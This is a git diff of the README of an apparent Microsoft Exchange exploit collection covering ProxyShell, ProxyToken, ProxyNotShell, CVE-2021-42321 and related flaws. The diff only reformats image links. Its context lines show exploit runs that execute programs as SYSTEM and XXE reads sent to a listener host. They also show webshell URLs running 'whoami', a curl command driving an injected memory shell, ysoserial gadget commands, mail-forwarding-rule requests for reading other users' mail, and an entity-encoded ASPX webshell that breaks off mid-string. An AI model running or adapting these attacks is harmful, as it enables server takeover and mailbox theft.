@@ -8,7 +8,7 @@ proxylogon & proxyshell & proxyoracle & proxytoken & all exchange server history
 
 ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! [Slides](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf) [Video](https://www.youtube.com/watch?v=5mqid-7zp8k)
 
-- ![](./pics/logo-black.png)
+![](./pics/logo-black.png)
 
 | NAME                                                                                                                  | CVE                                                                                                      | patch time       | description                                                                                                                                                                                                                                                                                          | avaliable |
 | --------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- |
@@ -79,13 +79,13 @@ exchange 2013 sp1 + windows 2012
 
 在Exchange Web Service(EWS)中，CredentialCache.DefaultCredentials运行在NT AUTHORITYSYSTEM权限之上。这将导致Exchange Server向攻击者的服务器发送NTLM hash。允许使用这些NTLM hash来进行HTTP身份验证。
 
-- ![](./pics/CVE-2018-8581.jpg)
+![](./pics/CVE-2018-8581.jpg)
 
 现在可以使用这些hash来访问Exchange Web Service(EWS)。由于它运行在NT AUTHORITY/SYSTEM级别，攻击者可以获得TokenSerializationRight的"特权"session。然后SOAP请求头存在的SSRF漏洞可以使其冒充任何用户，从而导致该提权漏洞的产生。
 
 下面是一个SOAP报头的示例，它模拟了具有S-1-5-21-4187549019-2363330540-1546371449-500的SID的管理员用户:
 
-- ![](./pics/CVE-2018-8581-1.jpg)
+![](./pics/CVE-2018-8581-1.jpg)
 
 攻击场景1: 攻击者利用此漏洞，以目标网络上的邮箱权限接管网络中任何人的收件箱，造成严重的信息泄露。
 
@@ -414,13 +414,13 @@ viewstate 的反序列化，成为第一个能直接在 exchange 服务器上执
 New-RoleGroup -Name "dlp users" -Roles "Data Loss Prevention" -Members "harrym"
 ```
 
-- ![](./pics/cve-2020-16875.png)
+![](./pics/cve-2020-16875.png)
 
 ```bash
 Get-RoleGroup "dlp users" | Format-List
 ```
 
-- ![](./pics/cve-2020-16875-1.png)
+![](./pics/cve-2020-16875-1.png)
 1. python poc
    
    - [cve-2020-16875.py](./CVE-2020-16875/cve-2020-16875.py)
@@ -434,9 +434,9 @@ Get-RoleGroup "dlp users" | Format-List
 (+) executed mspaint as SYSTEM!
 ```
 
-- ![](./pics/cve-2020-16875-2.png)
+![](./pics/cve-2020-16875-2.png)
 
-- ![](./pics/cve-2020-16875-3.png)
+![](./pics/cve-2020-16875-3.png)
 2. powershell poc
    
    - [cve-2020-16875.ps1](./CVE-2020-16875/cve-2020-16875.ps1)
@@ -490,7 +490,7 @@ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.Fi
 
 以下bypass payload直接替换[cve-2020-16875](./CVE-2020-16875/cve-2020-16875.py)poc脚本中的原poc代码即可，补丁绕过原理及手法分析以上文章链接写的很清楚
 
-- ![](./pics/CVE-2020-17132.png)
+![](./pics/CVE-2020-17132.png)
 
 - bypass1:
 
@@ -590,7 +590,7 @@ OriginatingServer           : WIN-UPF09R7H264.exchange2016.com
 ObjectState                 : Changed
 ```
 
-- ![](./pics/cve-2020-17083.png)
+![](./pics/cve-2020-17083.png)
 
 - 漏洞复现
 
@@ -609,7 +609,7 @@ PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-UPF09R7H264.
 (+) executed mspaint as SYSTEM!
 ```
 
-- ![](./pics/cve-2020-17083-1.png)
+![](./pics/cve-2020-17083-1.png)
 
 ```bash
 PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-2FFDIR22V0Q.exchange2013.com -usr administrator@exchange2013.com -pwd 123456Wx.. -cmd mspaint
@@ -620,7 +620,7 @@ PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-2FFDIR22V0Q.
 (+) executed mspaint as SYSTEM!
 ```
 
-- ![](./pics/cve-2020-17083-2.png)
+![](./pics/cve-2020-17083-2.png)
 
 # CVE-2020-17141 & CVE-2020-17143 XXE file read exploitation chain (completed)
 
@@ -651,7 +651,7 @@ Microsoft Exchange Server 2013 Cumulative Update 23
 
 此漏洞允许远程攻击者泄露受影响的Exchange Server的信息。利用此漏洞需要身份验证。特定的缺陷存在于对EWS service端点的RouteComplaint SOAP请求的处理过程中。这个问题是由于缺乏对用户提交的xml的适当验证造成的。攻击者可以利用此漏洞在SYSTEM上下文中泄露信息。
 
-- ![](./pics/cve-2020-17141.png)
+![](./pics/cve-2020-17141.png)
 
 ```bash
 (base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17141.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Users/Administrator/Desktop/CVE-2020-17141.txt"
@@ -675,7 +675,7 @@ MAPI=1
 
 此漏洞允许远程攻击者泄露受影响的Exchange Server的信息。利用此漏洞需要身份验证。该特定缺陷存在于GetWacIframeUrlForOneDrive服务命令的处理过程中。这个问题是由于缺乏对用户提交的xml验证造成的。攻击者可以利用此漏洞在SYSTEM上下文中泄露信息。
 
-- ![](./pics/cve-2020-17143.png)
+![](./pics/cve-2020-17143.png)
 
 ```bash
 (base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17143.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Users/Administrator/Desktop/CVE-2020-17141.txt"
@@ -754,9 +754,9 @@ Exchange Server 2016 < 15.01.2106.013
 Exchange Server 2013 < 15.00.1497.012
 ```
 
-- ![](pics/proxylogon.png)
-- ![](pics/proxylogon1.png)
-- ![](pics/proxylogon2.png)
+![](pics/proxylogon.png)
+![](pics/proxylogon1.png)
+![](pics/proxylogon2.png)
 
 # ProxyOracle (completed)
 
@@ -838,13 +838,13 @@ cadata=FVtSAAWdOn29HYDQry+kG+994VUdAxONrayi4nbJW9JWTh8yLueD6IxYpahfxcGsA/B3FoVUQ
 
 - just a modyfied version of [padre](https://github.com/glebarez/padre), added proxyoracle detect poc code...
 
-- ![](pics/proxyoracle.png)
+![](pics/proxyoracle.png)
 
 - python script exp usage:
 
 Decrypt this cookie to plaintext:
 
-- ![](pics/proxyoracle1.png)
+![](pics/proxyoracle1.png)
 
 # ProxyShell (completed)
 
@@ -902,37 +902,37 @@ generate proxyshell specified webshell payload.
 
 just put the webshell content you want to "webshell", then it will be fine...
 
-- ![](pics/proxyshell.png)
+![](pics/proxyshell.png)
 
 then put the encoded webshell to <t:Content>...</t:Content> in chkproxyshell.go
 
 confirm proxyshell and get the sid value to generate token.
 
-- ![](pics/proxyshell1.png)
+![](pics/proxyshell1.png)
 
 use the following py script to gen token value
 
-- ![](pics/proxyshell2.png)
+![](pics/proxyshell2.png)
 
 confirm the token is valid
 
-- ![](pics/proxyshell3.png)
+![](pics/proxyshell3.png)
 
 now use the token to send a email with shell attachment in, this may be saved as a draft in test user's mailbox...
 
-- ![](pics/proxyshell4.png)
+![](pics/proxyshell4.png)
 
-- ![](pics/proxyshell5.png)
+![](pics/proxyshell5.png)
 
-- ![](pics/proxyshell6.png)
+![](pics/proxyshell6.png)
 
 finnaly use the following wsman python script to export The draft to webshell, sometimes may write shell failed, try one more time will be fine :)
 
-- ![](pics/proxyshell7.png)
+![](pics/proxyshell7.png)
 
-- ![](pics/proxyshell8.png)
+![](pics/proxyshell8.png)
 
-- ![](pics/proxyshell9.png)
+![](pics/proxyshell9.png)
 
 access the shell and then execute the commands you want:
 
@@ -942,7 +942,7 @@ view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Wri
 
 shell is just work fine!!!
 
-- ![](pics/proxyshell10.png)
+![](pics/proxyshell10.png)
 
 command exec:
 
@@ -950,14 +950,14 @@ command exec:
 view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
 ```
 
-- ![](pics/proxyshell11.png)
-- ![](pics/proxyshell12.png)
+![](pics/proxyshell11.png)
+![](pics/proxyshell12.png)
 
 ## exploit proxyshell by using one click shell scripts from github
 
 - [proxyshell-auto](https://github.com/Udyz/proxyshell-auto)
 - [ProxyShell: More Ways for More Shells](https://www.horizon3.ai/proxyshell-more-ways-for-more-shells/)
-- ![](pics/proxyshell13.png)
+![](pics/proxyshell13.png)
 
 ## Pwn2Own 2021 Microsoft 3rd Exchange Exploit Chain (proxyshell but intresting exploit script)
 
@@ -1002,7 +1002,7 @@ Cookie: SecurityToken=x
 
 返回响应包页面状态为200，响应头中存在"msExchEcpCanary="及值，代表漏洞存在
 
-- ![](pics/proxytoken.png)
+![](pics/proxytoken.png)
 2. 第二步发送如下请求包，构造邮件转发规则到test@exchange2016.com邮箱，后续所有administrator@exchange2016.com发送给test@exchange2016.com邮箱的邮件，都会被重新转发一份给proxymail@exchange2016.com邮箱，从而实现任意邮箱读取
 
 ```bash
@@ -1027,7 +1027,7 @@ Content-Length: 327
 {"d":{"__type":"RuleRowResults:ECP","Cmdlets":["New-InboxRule"],"ErrorRecords":[],"Informations":[],"IsDDIEnabled":false,"Warnings":[],"Output":null}}
 ```
 
-- ![](pics/proxytoken1.png)
+![](pics/proxytoken1.png)
 
 ### golang proxytoken one click exploit
 
@@ -1039,17 +1039,17 @@ Content-Length: 327
 -ve: is the email that you want to attack and read the email ...
 ```
 
-- ![](pics/proxytoken2.png)
+![](pics/proxytoken2.png)
 
 邮件转发规则修改结果
 
-- ![](pics/proxytoken3.png)
+![](pics/proxytoken3.png)
 
 邮件发送测试，如下图，所有administrator@exchange2016.com发送给test@exchange2016.com邮箱的邮件，都会被重新转发一份给proxymail@exchange2016.com邮箱
 
-- ![](pics/proxytoken4.png)
-- ![](pics/proxytoken5.png)
-- ![](pics/proxytoken6.png)
+![](pics/proxytoken4.png)
+![](pics/proxytoken5.png)
+![](pics/proxytoken6.png)
 
 # Exchange Authenticated RCE CVE-2021-42321 (completed)
 
@@ -1098,11 +1098,11 @@ Exchange Server 2019 CU10 <= Oct21SU 15.2.922.14 15.02.0922.014
 
 修改后[TypeConfuseDelegateGenerator](./exch_CVE-2021-42321/TypeConfuseDelegateGenerator.cs)
 
-- ![](./pics/TypeConfuseDelegateGenerator.png)
+![](./pics/TypeConfuseDelegateGenerator.png)
 
 与原来的[TypeConfuseDelegateGenerator-origin](./exch_CVE-2021-42321/TypeConfuseDelegateGenerator-origin.cs)对比
 
-- ![](./pics/TypeConfuseDelegateGenerator1.png)
+![](./pics/TypeConfuseDelegateGenerator1.png)
 
 ```bash
 TypeConfuse链改为写入文件，即可绕过 windows definder 的 w3wp.exe启动进程。
@@ -1135,15 +1135,15 @@ a<%@ Page Language=\'JScript\' Debug=\'true\'%><%@Import Namespace=\'System.IO\'
 
 运行脚本，成功写入两个webshell，方便后续各种操作
 
-- ![](./pics/TypeConfuseDelegateGenerator2.png)
+![](./pics/TypeConfuseDelegateGenerator2.png)
 
-- ![](./pics/TypeConfuseDelegateGenerator3.png)
+![](./pics/TypeConfuseDelegateGenerator3.png)
 
 ```bash
 view-source:https://192.168.186.135/aspnet_client/luci.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
 ```
 
-- ![](./pics/TypeConfuseDelegateGenerator4.png)
+![](./pics/TypeConfuseDelegateGenerator4.png)
 
 ## 添加植入内存马gadget chain
 
@@ -1161,9 +1161,9 @@ Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 u
 
 将这个ClaimsPrincipal+ActivitySurrogateDisableTypeCheck反序列化链添加到[CVE-2021-42321_shell_write_exp.py](./CVE-2021-42321_shell_write_exp.py) exp脚本中
 
-- ![](./pics/memshell2.png)
+![](./pics/memshell2.png)
 
-- ![](./pics/memshell3.png)
+![](./pics/memshell3.png)
 
 将DisableActivitySurrogateSelectorTypeCheck更改为True以绕开.NET的限制后，使用弹计算器的TypeConfuseDelegate未修改版本gadget chain在目标上弹出计算器，以确认DisableActivitySurrogateSelectorTypeCheck成功更改为True
 
@@ -1173,7 +1173,7 @@ Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 u
 .\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "calc" -t
 ```
 
-- ![](./pics/memshell13.png)
+![](./pics/memshell13.png)
 2. 此处通过反序列化生成内存马的方式主要参考：
    
    - [DotNet内存马-HttpListener](https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w)
@@ -1189,22 +1189,22 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System
 编译完之后会在目录下生成一个memshell.dll文件，将其改名为e.dll后续生成反序列化链需要用到
 
 - [HttpListener - e.dll](./HttpListener/e.dll)
-- ![](./pics/memshell.png)
+![](./pics/memshell.png)
 
 将e.dll文件复制到ysoserial.exe的bin目录中
 
-- ![](./pics/memshell1.png)
+![](./pics/memshell1.png)
 
 现在生成加载e.dll，注入内存马的ClaimsPrincipal + ActivitySurrogateSelector结合的gadget chain
 
 [ActivitySurrogateSelectorGenerator.cs](./ysoserial.net-modified/ysoserial/Generators/ActivitySurrogateSelectorGenerator.cs)文件中加载e.dll的流程
 
-- ![](./pics/memshell4.png)
-- ![](./pics/memshell5.png)
+![](./pics/memshell4.png)
+![](./pics/memshell5.png)
 
 及自带的Disable ActivitySurrogate type protections during generation功能
 
-- ![](./pics/memshell6.png)
+![](./pics/memshell6.png)
 
 ```bash
 .\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateSelector --minify --ust
@@ -1212,18 +1212,18 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System
 
 将这个ClaimsPrincipal+ActivitySurrogateSelector反序列化链添加到[CVE-2021-42321_shell_write_exp.py](./exch_CVE-2021-42321/CVE-2021-42321_shell_write_exp.py) exp脚本中
 
-- ![](./pics/memshell7.png)
+![](./pics/memshell7.png)
 
-- ![](./pics/memshell8.png)
+![](./pics/memshell8.png)
 
 - 本地测试最终exp
 1. exp运行前:
    
-   - ![](./pics/memshell9.png)
+   ![](./pics/memshell9.png)
 
 2. 运行exp脚本，一键注入.net内存马
    
-   - ![](./pics/memshell10.png)
+   ![](./pics/memshell10.png)
 
 3. 查看内存马命令执行效果
 
@@ -1231,8 +1231,8 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System
 curl http://192.168.186.135/favicon.ico -H "Type: cmd"  -d "pass=whoami"
 ```
 
-- ![](./pics/memshell11.png)
-- ![](./pics/memshell12.png)
+![](./pics/memshell11.png)
+![](./pics/memshell12.png)
 
 #### note: 后续会另开一个github仓库深入分析.net内存马原理和实战利用方式
 
@@ -1254,7 +1254,7 @@ curl http://192.168.186.135/favicon.ico -H "Type: cmd"  -d "pass=whoami"
 
 KB5007409得到修复，最终反序列化的地方, 此处
 
-- ![](./pics/repair.png)
+![](./pics/repair.png)
 
 this.formatter为IClientExtensionCollectionFormatter的实现，仅剩
 
@@ -1395,7 +1395,7 @@ ProxyShell漏洞的利用只发生在端口443上(HTTPS)，而ProxyNotShell端�
 
 通过WSMAN协议访问基于web的企业管理(WBEM)。攻击者在易受攻击的系统上启动shell，以便通过Windows远程管理(PsRemoting)进一步执行PowerShell脚本。
 
-- ![](pics/proxynotshell5.png)
+![](pics/proxynotshell5.png)
 
 - request
 
@@ -1470,7 +1470,7 @@ Content-Length: 866
 
 启动shell后，攻击者立即延长其生命周期；否则，默认情况下，由于shell的过期时间太短，shell将被关闭。这是在Exchange Server上进一步执行命令所必需的。要做到这一点，攻击者立即通过启用keep alive选项的WSMAN发送一个特殊请求。
 
-- ![](pics/proxynotshell6.png)
+![](pics/proxynotshell6.png)
 
 - request
 
@@ -1541,11 +1541,11 @@ Content-Length: 678
 
 之后，攻击者利用第二个漏洞CVE-2022-41082。通过使用PowerShell Remoting，攻击者发送一个创建地址簿的请求，传递带有特殊payload的编码和序列化数据作为参数。在发布的PoC中，这个编码的数据包含一个名为System.UnitySerializationHolder的gadget生成System.Windows.Markup.XamlReader类的对象。该类处理来自payload的XAML数据，从而创建System.Diagnostics类的新对象。并在目标系统上打开新进程的方法调用。在网上公布的PoC中，这个进程是calc.exe。
 
-- ![](pics/proxynotshell7.png)
+![](pics/proxynotshell7.png)
 
 执行calc.exe进程的主payload部分
 
-- ![](pics/proxynotshell8.png)
+![](pics/proxynotshell8.png)
 
 - request
 
@@ -1700,9 +1700,9 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxyn
 [+] Success remove session
 ```
 
-- ![](pics/proxynotshell.png)
+![](pics/proxynotshell.png)
 
-- ![](pics/proxynotshell1.png)
+![](pics/proxynotshell1.png)
 2. 使用poc脚本写入txt文本
 
 ```bash
@@ -1717,7 +1717,7 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxyn
 [+] Success remove session
 ```
 
-- ![](pics/proxynotshell2.png)
+![](pics/proxynotshell2.png)
 3. 使用poc脚本启动cmd.exe
 
 ```bash
@@ -1732,7 +1732,7 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxyn
 [+] Success remove session
 ```
 
-- ![](pics/proxynotshell3.png)
+![](pics/proxynotshell3.png)
 
 ## Metasploit ProxyNotShell RCE exp 本地测试
 
@@ -1742,7 +1742,7 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxyn
 
 官方说仅支持Exchange Server 2019 (version 15.2)，可以使用CU12之前的未打补丁的exchange试试，本地暂无环境
 
-- ![](pics/proxynotshell4.png)
+![](pics/proxynotshell4.png)
 - [exchange_proxynotshell_rce.rb](./proxynotshell/exchange_proxynotshell_rce.rb)
 
 需要后续修改metasploit proxynotshell rb脚本以适配各个版本exchange
@@ -1851,7 +1851,7 @@ psi.Arguments = " -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoAC
 
 将原始的DataSetTypeSpoofGenerator.cs的内容修改为如下所示:
 
-- ![](pics/CVE-2022-23277-2.png)
+![](pics/CVE-2022-23277-2.png)
 
 最后重新编译ysoserial.net得到可用gadget chain，放入python exp脚本中即可
 
@@ -1859,14 +1859,14 @@ psi.Arguments = " -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoAC
 
 - [cve-2022-23277-exp.py](./CVE-2022-23277-main/cve-2022-23277-exp.py)
 
-- ![](pics/CVE-2022-23277.png)
+![](pics/CVE-2022-23277.png)
 
-- ![](pics/CVE-2022-23277-1.png)
+![](pics/CVE-2022-23277-1.png)
 3. 使用metasploit的[Microsoft Exchange Server ChainedSerializationBinder RCE模块](./CVE-2022-23277-main/exchange_chainedserializationbinder_rce.rb)
 
 能成功检测，但是无法执行文件没有session返回?
 
-- ![](pics/CVE-2022-23277-0.png)
+![](pics/CVE-2022-23277-0.png)
 
 # CVE-2023-21707 (反序列化远程代码执行) (暂无域环境)
 
@@ -1887,7 +1887,7 @@ psi.Arguments = " -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoAC
  < Exchange Server 2013 CU23 Feb23SU    February 14, 2023    15.0.1497.47    15.00.1497.047
 ```
 
-- ![](./pics/CVE-2023-21707.png)
+![](./pics/CVE-2023-21707.png)
 
 - [Proxynotshell 反序列化及 CVE-2023-21707 漏洞研究](https://xz.aliyun.com/t/12634?accounttraceid=97643b6cad1f48a9bc8b9b3016267889gmyp)
 
@@ -1982,7 +1982,7 @@ Connection: close
 Content-Length: 0
 ```
 
-- ![](./pics/proxymaybeshell.png)
+![](./pics/proxymaybeshell.png)
 
 通过autodiscover接口的ntlm认证信息获取内网域名等信息：
 
@@ -2334,11 +2334,11 @@ Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zM
 &#x3c;&#x25;&#x40;&#x20;&#x50;&#x61;&#x67;&#x65;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x43;&#x23;&#x22;&#x20;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x2e;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x4d;&#x6f;&#x64;&#x65;&#x6c;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x73;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x41;&#x73;&#x73;&#x65;&#x6d;&#x62;&#x6c;&#x79;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2c;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x31;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x30;&#x2c;&#x43;&#x75;&#x6c;&#x74;&#x75;&#x72;&#x65;&#x3d;&#x6e;&#x65;&#x75;&#x74;&#x72;&#x61;&#x6c;&#x2c;&#x50;&#x75;&#x62;&#x6c;&#x69;&#x63;&#x4b;&#x65;&#x79;&#x54;&#x6f;&#x6b;&#x65;&#x6e;&#x3d;&#x33;&#x31;&#x42;&#x46;&#x33;&#x38;&#x35;&#x36;&#x41;&#x44;&#x33;&#x36;&#x34;&#x45;&#x33;&#x35;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x63;&#x23;&#x22;&#x20;&#x72;&#x75;&#x6e;&#x61;&#x74;&#x3d;&#x22;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x22;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x74;&#x65;&#x20;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x74;&#x72;&#x79;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x46;&#x61;&#x63;&#x74;&#x6f;&#x72;&#x79;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x4f;&#x70;&#x65;&#x6e;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x3d;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x28;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x28;&#x22;&#x4f;&#x75;&#x74;&#x2d;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3c;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x3e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x20;&#x3d;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x49;&#x6e;&#x76;&#x6f;&#x6b;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x6c;&#x6f;&#x73;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x66;&#x6f;&#x72;&#x65;&#x61;&#x63;&#x68;&#x20;&#x28;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x6f;&#x62;&#x6a;&#x20;&#x69;&#x6e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x29;&#x0a;&#x